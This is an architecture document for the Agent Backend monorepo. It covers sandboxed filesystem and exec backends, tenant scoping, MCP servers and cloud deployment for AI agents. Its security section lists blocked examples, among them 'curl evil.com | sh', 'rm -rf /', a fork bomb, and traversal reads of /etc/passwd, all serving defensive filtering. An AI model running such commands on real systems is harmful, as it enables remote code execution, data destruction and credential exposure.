# Agent Backend - Architecture

Current architecture after monorepo restructure (v0.7.0).

---

## Overview

Agent Backend is a monorepo containing two packages:

1. **constellationfs** - Client library for building applications
2. **agentbe-server** - Server infrastructure for deployment

---

## Package Structure

```
agent-backend/
├── constellation-typescript/     # Client library (npm: constellationfs)
│   ├── src/
│   │   ├── backends/            # Backend implementations
│   │   ├── mcp/client.ts        # Lightweight MCP client wrapper
│   │   ├── logging/             # Operations logging
│   │   ├── utils/               # Utilities
│   │   └── index.ts             # Public API
│   ├── package.json
│   └── README.md
│
├── agentbe-server/              # Server infrastructure (npm: agentbe-server)
│   ├── src/
│   │   ├── mcp/
│   │   │   ├── servers/         # Backend-specific MCP servers
│   │   │   └── base/tools.ts    # Shared tool implementations
│   │   └── index.ts             # Server class exports
│   ├── bin/
│   │   └── agentbe-server.js    # CLI entry point
│   ├── deploy/
│   │   ├── docker/              # Docker image definition
│   │   ├── scripts/             # Cloud VM startup scripts
│   │   └── deploy-tool/         # Web UI for deployment
│   ├── package.json
│   └── README.md
│
├── package.json                 # Monorepo workspace config
├── pnpm-workspace.yaml
└── README.md                    # Main documentation
```

---

## Backend Interface Hierarchy

```
Backend (base interface)
├── type: BackendType
├── rootDir: string
├── scope(path): ScopedBackend
├── getMCPClient(): Promise<Client>
└── destroy(): Promise<void>

FileBasedBackend extends Backend
├── All file operations (read, write, mkdir, etc.)
└── exec(command): Promise<string | Buffer>

Implementations:
├── LocalFilesystemBackend implements FileBasedBackend
│   └── Isolation: bwrap (Linux) | software | none
├── RemoteFilesystemBackend implements FileBasedBackend
│   └── Transport: SSH/SFTP
└── MemoryBackend implements FileBasedBackend
    └── exec() throws NotImplementedError
```

---

## Core Concepts

### 1. Backends

Backends provide filesystem and execution capabilities. Three types:

**LocalFilesystemBackend:**
- Executes operations on local machine
- Optional bwrap isolation (Linux)
- Software-based isolation (all platforms)
- Direct filesystem access

**RemoteFilesystemBackend:**
- Executes operations on remote machine via SSH
- SFTP for file operations
- SSH for command execution
- Connection pooling

**MemoryBackend:**
- In-memory key/value store
- Filesystem-like API
- No command execution
- Fast, ephemeral storage

### 2. Scoping

All backends support scoping for multi-tenancy:

```typescript
const backend = new LocalFilesystemBackend({ rootDir: '/var/workspace' })

// Each user gets isolated scope
const user1 = backend.scope('users/user1')
const user2 = backend.scope('users/user2')

// Operations stay within scope
await user1.write('data.txt', 'content')  // writes to /var/workspace/users/user1/data.txt
await user2.read('../user1/data.txt')     // ❌ Blocked - cannot escape scope
```

**Scoped Backends:**
- `ScopedFilesystemBackend` - for Local and Remote backends
- `ScopedMemoryBackend` - for Memory backend

**Features:**
- Path convenience (operations are relative to scope)
- Security (cannot escape scope boundary)
- Isolation (OS-level when available)
- Environment variable merging
- Nested scoping support

### 3. MCP Integration

Each backend can spawn its own MCP server:

```typescript
const backend = new LocalFilesystemBackend({ rootDir: '/tmp/ws' })
const mcp = await backend.getMCPClient()

// Use MCP tools
const result = await mcp.callTool({
  name: 'exec',
  arguments: { command: 'npm install' }
})
```

**How it works:**
1. `getMCPClient()` spawns `agentbe-server` CLI with appropriate flags
2. Server creates backend-specific MCP server class
3. Server connects via stdio transport
4. Returns connected MCP Client

**Backend-Specific Servers:**
- `LocalFilesystemMCPServer` - filesystem tools + exec
- `RemoteFilesystemMCPServer` - filesystem tools + exec
- `MemoryMCPServer` - filesystem tools only (no exec)

### 4. Connection Pooling

For stateless web servers, pool backends to reuse connections:

```typescript
const pool = new BackendPoolManager({
  backendClass: RemoteFilesystemBackend,
  defaultConfig: { ... }
})

// Reuses SSH connections
await pool.withBackend(
  { key: 'org1' },
  async (backend) => {
    const user = backend.scope(`users/${userId}`)
    return await user.exec('npm run build')
  }
)
```

**Features:**
- Key-based pooling
- Automatic cleanup
- Connection reuse
- Generic (works with any backend)

---

## Security Model

### Isolation Levels

**Bwrap (Linux only):**
- OS-level namespace isolation
- Filesystem sandboxing
- No root required
- Strongest isolation

**Software:**
- Path validation (blocks `../`, absolute paths)
- Command safety checks (blocks `rm -rf /`, `sudo`, etc.)
- Works on all platforms
- Good for most use cases

**None:**
- No isolation
- For trusted environments only
- Use with caution

### Path Validation

All backends validate paths to prevent escapes:

```typescript
// ❌ Blocked
await backend.read('/etc/passwd')           // Absolute path
await backend.read('../../../etc/passwd')   // Directory traversal
await backend.read('~/secret.txt')          // Home directory

// ✅ Allowed
await backend.read('config.json')           // Relative path
await backend.read('src/index.ts')          // Nested path
await backend.read('./data/file.txt')       // Explicit relative
```

### Command Safety

Dangerous commands are blocked by default:

```typescript
// ❌ Blocked (when preventDangerous: true)
await backend.exec('rm -rf /')
await backend.exec('sudo apt-get install')
await backend.exec('curl evil.com | sh')
await backend.exec(':(){ :|:& };:')  // Fork bomb

// ✅ Allowed
await backend.exec('npm install')
await backend.exec('git clone ...')
await backend.exec('python script.py')
```

### Scope Boundaries

Scoped backends enforce strict boundaries:

```typescript
const user1 = backend.scope('users/user1')
const user2 = backend.scope('users/user2')

// ❌ Blocked - cannot escape scope
await user1.read('../user2/secret.txt')
await user1.exec('cd ../user2 && cat secret.txt')
await user1.write('../user2/hack.txt', 'pwned')

// ✅ Allowed - within scope
await user1.read('my-data.txt')
await user1.exec('ls')
```

---

## MCP Server Architecture

### Tool Registration

Shared tool implementations in `agentbe-server/src/mcp/base/tools.ts`:

**registerFilesystemTools():**
- read_text_file
- read_media_file
- read_multiple_files
- write_file
- edit_file
- create_directory
- list_directory
- list_directory_with_sizes
- directory_tree
- move_file
- search_files
- get_file_info
- list_allowed_directories

**registerExecTool():**
- exec (only for Local and Remote servers)

### Backend-Specific Servers

**LocalFilesystemMCPServer:**
```typescript
class LocalFilesystemMCPServer {
  constructor(backend: LocalFilesystemBackend) {
    this.server = new McpServer({ name: 'local-filesystem', version: '1.0.0' })
    registerFilesystemTools(this.server, async () => this.backend)
    registerExecTool(this.server, async () => this.backend)  // ✅ Includes exec
  }
}
```

**MemoryMCPServer:**
```typescript
class MemoryMCPServer {
  constructor(backend: MemoryBackend) {
    this.server = new McpServer({ name: 'memory', version: '1.0.0' })
    registerFilesystemTools(this.server, async () => this.backend)
    // ❌ Does NOT register exec tool
  }
}
```

---

## CLI Architecture

### Command Structure

```bash
agentbe-server [COMMAND] [OPTIONS]

Commands:
  (default)              # Start MCP server
  start-remote [--build] # Start Docker remote backend
  stop-remote            # Stop Docker remote backend
  help                   # Show help
```

### MCP Server Command

```bash
# Local filesystem
agentbe-server --backend local --rootDir /tmp/workspace

# Remote filesystem
agentbe-server --backend remote --rootDir /var/workspace \
  --host server.com --username agent --password secret

# Memory
agentbe-server --backend memory --rootDir /memory
```

**Implementation:**
1. Parse command-line arguments
2. Create appropriate backend instance
3. Create backend-specific MCP server
4. Connect stdio transport
5. Start server

### Docker Remote Management

```bash
# Start remote backend service
agentbe-server start-remote

# Behind the scenes:
# 1. Check if Docker is installed
# 2. Build image (if --build flag)
# 3. Start container (docker-compose or docker run)
# 4. Container runs SSH + MCP server
# 5. Accessible via localhost:2222 (SSH)
```

---

## Deployment Architecture

### Two-Layer Deployment

**Layer 1: Docker Image** (`deploy/docker/`)
```
Dockerfile.runtime      # Build image
entrypoint.sh          # Container startup script
docker-compose.yml     # Local deployment config
```

**Purpose:** Create publishable Docker image

**Layer 2: VM Deployment** (`deploy/scripts/`)
```
azure-vm-startup.sh    # Azure cloud-init script
gcp-vm-startup.sh      # GCP cloud-init script
```

**Purpose:** Bootstrap VM, install Docker, run container

### Deployment Flow

1. **Build Image:**
   ```bash
   docker build -f deploy/docker/Dockerfile.runtime -t agentbe/remote-backend .
   ```

2. **Publish to Registry:**
   ```bash
   docker push ghcr.io/aspects-ai/agentbe-remote:latest
   ```

3. **Deploy VM:**
   - Cloud provider creates VM
   - Runs startup script (cloud-init)
   - Script installs Docker
   - Script pulls published image
   - Script starts container

4. **Access:**
   - SSH: `ssh root@vm-ip -p 2222`
   - MCP: Create RemoteFilesystemBackend pointing to VM

---

## Data Flow

### Local Operations

```
User Code
  ↓
LocalFilesystemBackend.exec('npm install')
  ↓
Path validation (blocks escapes)
  ↓
Command safety check (blocks dangerous)
  ↓
[Bwrap isolation if enabled]
  ↓
spawn('bash', ['-c', 'npm install'], { cwd: '/workspace/...' })
  ↓
Return stdout
```

### Remote Operations

```
User Code
  ↓
RemoteFilesystemBackend.exec('npm install')
  ↓
Path validation (blocks escapes)
  ↓
SSH connection (pooled)
  ↓
Execute on remote host
  ↓
Return stdout
```

### MCP Operations

```
User Code
  ↓
backend.getMCPClient()
  ↓
Spawn: agentbe-server --backend local --rootDir /tmp/ws
  ↓
agentbe-server creates LocalFilesystemMCPServer
  ↓
Server connects stdio transport
  ↓
Returns Client
  ↓
mcp.callTool({ name: 'exec', arguments: { command: '...' } })
  ↓
Server routes to backend.exec()
  ↓
Return result
```

---

## Key Design Decisions

### 1. Direct Class Instantiation (No Factory)

**Decision:** Users instantiate backend classes directly

```typescript
// ✅ Direct instantiation
const backend = new LocalFilesystemBackend({ rootDir: '/tmp/ws' })

// ❌ Old: Factory pattern
const backend = BackendFactory.create('local', { ... })
```

**Rationale:**
- More explicit
- Better TypeScript support
- Simpler mental model
- No magic string lookups

### 2. Per-Instance Configuration (No Global Config)

**Decision:** Each backend has its own configuration

```typescript
// ✅ Per-instance
const backend = new LocalFilesystemBackend({ rootDir: '/tmp/ws' })

// ❌ Old: Global config
ConstellationFS.setConfig({ workspaceRoot: '/tmp' })
const fs = new FileSystem({ userId: 'user123' })
```

**Rationale:**
- More flexible
- Clearer ownership
- Better for testing
- No global state

### 3. Scoping Instead of userId

**Decision:** Applications manage multi-tenancy via scoping

```typescript
// ✅ Scoping
const user1 = backend.scope('users/user1')
const user2 = backend.scope('users/user2')

// ❌ Old: userId at backend level
const user1Backend = new FileSystem({ userId: 'user1' })
```

**Rationale:**
- More flexible
- Nested scopes
- Simpler backend API
- App controls structure

### 4. Backend-Specific MCP Servers

**Decision:** Each backend type has its own MCP server class

```typescript
// ✅ Backend-specific servers
LocalFilesystemMCPServer   // Has exec tool
MemoryMCPServer           // No exec tool

// ❌ Old: Universal server with runtime filtering
```

**Rationale:**
- Tool filtering at server level (compile-time)
- Clear separation of capabilities
- Easier to maintain
- Better type safety

### 5. CLI in Server Package

**Decision:** CLI lives in `agentbe-server`, not client library

**Rationale:**
- Client library is pure (no server code)
- Server users get everything (servers + CLI)
- Clean separation of concerns
- Users installing client don't get server code

---

## Future Considerations

### Planned Enhancements

1. **Database Backend** - Structured data storage
2. **S3 Sync** - Sync MemoryBackend to S3
3. **Webhook Support** - Event notifications
4. **Metrics & Monitoring** - Usage tracking
5. **Rate Limiting** - Prevent abuse

### Potential Improvements

1. **In-Process MCP Servers** - Alternative to spawning agentbe-server
2. **HTTP MCP Transport** - For web-based clients
3. **Distributed Backends** - Multi-node support
4. **Custom Isolation Strategies** - Plugin system
5. **Performance Optimizations** - Caching, batching

---

## Migration Notes

### From v0.6.x to v0.7.0

**Breaking Changes:**
- `FileSystem` class removed → Use `LocalFilesystemBackend`
- `Workspace` classes removed → Use `scope()`
- Global `ConstellationFS.setConfig()` removed → Per-instance config
- `userId` removed from backend → Use scoping
- CLI moved to `agentbe-server` package

**Migration Example:**

```typescript
// Before (v0.6.x)
import { ConstellationFS, FileSystem } from 'constellationfs'

ConstellationFS.setConfig({ workspaceRoot: '/tmp/workspace' })
const fs = new FileSystem({ userId: 'user123' })
const workspace = await fs.getWorkspace('project')
await workspace.exec('npm install')

// After (v0.7.0)
import { LocalFilesystemBackend } from 'constellationfs'

const backend = new LocalFilesystemBackend({
  rootDir: '/tmp/workspace'
})
const userBackend = backend.scope('users/user123')
const projectBackend = userBackend.scope('project')
await projectBackend.exec('npm install')
await backend.destroy()
```

---

## Summary

**Current Architecture (v0.7.0):**
- ✅ Clean monorepo structure
- ✅ Separate client and server packages
- ✅ Backend interface hierarchy
- ✅ Scoping for multi-tenancy
- ✅ Backend-specific MCP servers
- ✅ Comprehensive CLI
- ✅ Deployment infrastructure
- ✅ Security-first design
- ✅ Production-ready

**Next Steps:**
- Write comprehensive tests
- Add CI/CD pipeline
- Publish packages to npm
- Create migration guide
- Build example applications
